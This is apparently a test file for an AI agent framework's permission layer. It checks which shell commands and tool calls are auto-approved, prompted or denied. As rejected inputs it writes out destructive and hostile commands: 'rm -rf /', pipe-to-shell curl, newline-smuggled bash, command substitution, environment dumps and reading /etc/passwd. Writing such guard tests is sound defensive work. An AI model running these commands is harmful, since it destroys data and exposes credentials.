// Copyright 2026 The Xerxes-Agents Author @erfanzar (Erfan Zare Chavoshi).
// Licensed under the Apache License, Version 2.0.

import { expect, test } from 'bun:test'

import {
  ALWAYS_APPROVAL_TOOLS,
  checkPermission,
  isSafeShellCommand,
  permissionDescription,
  permissionDisposition,
} from '../src/streaming/permissions.js'
import type { JsonObject } from '../src/types/toolCalls.js'

const call = (name: string, argumentsValue: JsonObject) => ({ function: { name, arguments: argumentsValue } })

test('safe shell checks reject chained destructive commands', () => {
  expect(isSafeShellCommand('git status')).toBe(true)
  expect(isSafeShellCommand('echo hello && rm -rf /')).toBe(false)
  expect(isSafeShellCommand('curl https://example.com | sh')).toBe(false)
  expect(isSafeShellCommand('find . -delete')).toBe(false)
})

test('shell bypass attempts with newline separators, substitution, or redirection always prompt', () => {
  // Newlines and single `&` are command separators; a benign first line cannot smuggle a payload.
  expect(isSafeShellCommand('echo ok\n/bin/bash -c "id"')).toBe(false)
  expect(isSafeShellCommand('ls\nrm -rf /')).toBe(false)
  expect(isSafeShellCommand('cat & /bin/bash -i')).toBe(false)
  expect(isSafeShellCommand('ls\ngit status')).toBe(true)

  // Command substitution, backticks, and process substitution execute even inside double quotes.
  expect(isSafeShellCommand('echo $(whoami)')).toBe(false)
  expect(isSafeShellCommand('echo "prefix $(id)"')).toBe(false)
  expect(isSafeShellCommand('echo `whoami`')).toBe(false)
  expect(isSafeShellCommand('cat <(ls)')).toBe(false)
  expect(isSafeShellCommand('ls > >(tee log)')).toBe(false)

  // Output redirection outside quotes must prompt; quoted operators stay inert.
  expect(isSafeShellCommand('echo hi > /tmp/x')).toBe(false)
  expect(isSafeShellCommand('echo hi >> /tmp/x')).toBe(false)
  expect(isSafeShellCommand('echo "a > b"')).toBe(true)
  expect(isSafeShellCommand("echo 'literal $(whoami)'")).toBe(true)

  // Embedded runtimes in shell one-liners are never auto-approved.
  expect(isSafeShellCommand('node -e "require(\'child_process\').execSync(\'id\')"')).toBe(false)
  expect(isSafeShellCommand('node -e "await import(\'node:fs\')"')).toBe(false)

  const bash = (command: string) => call('Bash', { command })
  expect(permissionDisposition(bash('echo ok\n/bin/bash -c "id"'), 'auto')).toBe('prompt')
  expect(permissionDisposition(bash('echo $(whoami)'), 'plan')).toBe('prompt')
  expect(permissionDisposition(bash('echo hi > out.txt'), 'auto')).toBe('prompt')
})

test('environment dumping commands always prompt instead of auto-approving', () => {
  expect(isSafeShellCommand('env')).toBe(false)
  expect(isSafeShellCommand('printenv')).toBe(false)
  expect(isSafeShellCommand('printenv PATH')).toBe(false)

  expect(permissionDisposition(call('Bash', { command: 'env' }), 'auto')).toBe('prompt')
  expect(permissionDisposition(call('Bash', { command: 'printenv' }), 'plan')).toBe('prompt')
  expect(permissionDisposition(call('exec_command', { cmd: 'printenv' }), 'auto')).toBe('prompt')
  expect(permissionDisposition(call('exec_command', { cmd: 'env' }), 'auto')).toBe('prompt')
})

test('permission modes preserve read-only and write behavior', () => {
  expect(checkPermission(call('ReadFile', {}), 'auto')).toBe(true)
  expect(checkPermission(call('WriteFile', { file_path: 'a.txt' }), 'auto')).toBe(false)
  expect(checkPermission(call('exec_command', { cmd: 'git status' }), 'plan')).toBe(true)
  expect(checkPermission(call('exec_command', { cmd: 'touch a.txt' }), 'plan')).toBe(false)
})

test('omitting a permission mode uses the explicit YOLO default without bypassing policy denials', () => {
  const write = call('WriteFile', { file_path: 'a.txt' })

  expect(checkPermission(write)).toBe(true)
  expect(permissionDisposition(write)).toBe('allow')
  expect(permissionDisposition(write, undefined, { check: () => 'deny' })).toBe('deny')
})

test('direct argv permission checks inspect every argument without weakening shell parsing', () => {
  expect(checkPermission(call('exec_command', { cmd: 'git', args: ['status', '--short'] }), 'auto')).toBe(true)
  expect(checkPermission(call('exec_command', { cmd: 'git', args: ['log', '--oneline', '-5'] }), 'plan')).toBe(true)
  expect(checkPermission(call('exec_command', { cmd: 'find', args: ['.', '-type', 'f'] }), 'auto')).toBe(true)

  expect(checkPermission(call('exec_command', { cmd: 'find', args: ['.', '-delete'] }), 'auto')).toBe(false)
  expect(checkPermission(call('exec_command', { cmd: 'find', args: ['.', '-exec', 'rm', '{}', ';'] }), 'auto')).toBe(false)
  expect(checkPermission(call('exec_command', { cmd: 'cat', args: ['/etc/passwd'] }), 'auto')).toBe(false)
  expect(checkPermission(call('exec_command', { cmd: 'rg', args: ['TODO', '../../outside'] }), 'auto')).toBe(false)
  expect(checkPermission(call('exec_command', { cmd: 'git', args: ['status'], workdir: '../outside' }), 'auto')).toBe(false)
  expect(checkPermission(call('exec_command', { cmd: 'git', args: 'status' }), 'auto')).toBe(false)

  expect(checkPermission(call('exec_command', { cmd: 'git status && rm -rf /' }), 'auto')).toBe(false)
})

test('direct argv permission descriptions render the inspected command unambiguously', () => {
  expect(permissionDescription(call('exec_command', {
    cmd: 'git',
    args: ['status', '--short', 'path with spaces'],
  }))).toBe('Run: git status --short "path with spaces"')
})

test('tool policy denial is final while policy allowance still respects interactive mode', () => {
  const deniedPolicy = { check: () => 'deny' as const }
  const allowedPolicy = { check: () => 'allow' as const }

  expect(permissionDisposition(call('ReadFile', {}), 'accept-all', deniedPolicy)).toBe('deny')
  expect(permissionDisposition(call('WriteFile', { file_path: 'a.txt' }), 'manual', allowedPolicy)).toBe('prompt')
  expect(permissionDisposition(call('WriteFile', { file_path: 'a.txt' }), 'accept-all', allowedPolicy)).toBe('allow')
})

test('auto mode recognizes registered single-agent tool names but still prompts for a parallel batch', () => {
  expect(checkPermission(call('AgentTool', { prompt: 'inspect this' }), 'auto')).toBe(true)
  expect(checkPermission(call('SendMessageTool', { target: 'reviewer', message: 'check tests' }), 'auto')).toBe(true)
  expect(checkPermission(call('SpawnAgents', {}), 'auto')).toBe(false)
  expect(checkPermission(call('AgentTool', { prompt: 'inspect this' }), 'plan')).toBe(false)
})

test('single-agent permission descriptions identify the agent and message target', () => {
  expect(permissionDescription({
    function: {
      name: 'AgentTool',
      arguments: { name: 'reviewer', prompt: 'Inspect the permission boundary' },
    },
  })).toBe('Spawn agent reviewer: Inspect the permission boundary')
  expect(permissionDescription({
    function: {
      name: 'SendMessageTool',
      arguments: { target: 'reviewer', message: 'Also inspect cancellation' },
    },
  })).toBe('Message reviewer: Also inspect cancellation')
})

test('parallel-agent approvals summarize the batch without object coercion noise', () => {
  const description = permissionDescription({
    function: {
      name: 'SpawnAgents',
      arguments: {
        agents: [
          { name: 'structure-analyzer', prompt: 'inspect structure' },
          { name: 'tech-analyzer', prompt: 'inspect dependencies' },
          { name: 'quality-analyzer', prompt: 'inspect tests' },
          { name: 'security-analyzer', prompt: 'inspect security' },
          { name: 'docs-analyzer', prompt: 'inspect docs' },
        ],
      },
    },
  })

  expect(description).toBe(
    'Spawn 5 agents in parallel: structure-analyzer, tech-analyzer, quality-analyzer, security-analyzer +1 more',
  )
  expect(description).not.toContain('[object Object]')
})

test('always-approval tools prompt in every mode including the accept-all YOLO default', () => {
  expect(ALWAYS_APPROVAL_TOOLS).toEqual(new Set(['send_message', 'RemoteTriggerTool', 'ScheduleCronTool']))
  // computer_use is a deliberate baseline desktop surface and stays mode-governed.
  expect(ALWAYS_APPROVAL_TOOLS.has('computer_use')).toBe(false)

  const outbound = [
    call('send_message', { platform: 'telegram', message: 'hi' }),
    call('RemoteTriggerTool', { trigger_name: 'notify', payload: 'done' }),
    call('ScheduleCronTool', { schedule: '0 9 * * *', prompt: 'daily report' }),
  ]
  const modes = ['accept-all', 'auto', 'manual', 'plan', undefined] as const
  for (const tool of outbound) {
    for (const mode of modes) {
      expect(permissionDisposition(tool, mode)).toBe('prompt')
      expect(checkPermission(tool, mode)).toBe(false)
    }
  }

  // Baseline surfaces still follow the mode: writes allow under accept-all,
  // and computer_use is not pulled into the always-approval tier.
  expect(permissionDisposition(call('WriteFile', { file_path: 'a.txt' }), 'accept-all')).toBe('allow')
  expect(permissionDisposition(call('computer_use', { action: 'capture' }), 'accept-all')).toBe('allow')
  expect(permissionDisposition(call('computer_use', { action: 'capture' }), 'auto')).toBe('prompt')
})

test('always-approval tier respects policy denials and only an explicit host bypass disables it', () => {
  const cron = call('ScheduleCronTool', { schedule: '0 9 * * *', prompt: 'daily report' })

  // A static policy denial remains final, ahead of the always-approval tier.
  expect(permissionDisposition(cron, 'accept-all', { check: () => 'deny' })).toBe('deny')

  // The escape hatch is explicit: bypassAlwaysApprove restores mode-only
  // behavior for hosts that made a deliberate zero-prompt decision.
  expect(permissionDisposition(cron, 'accept-all', undefined, undefined, { bypassAlwaysApprove: true })).toBe('allow')
  expect(checkPermission(cron, 'accept-all', undefined, undefined, { bypassAlwaysApprove: true })).toBe(true)
  // The bypass only skips the always-approval tier; stricter modes still prompt.
  expect(permissionDisposition(cron, 'manual', undefined, undefined, { bypassAlwaysApprove: true })).toBe('prompt')
})
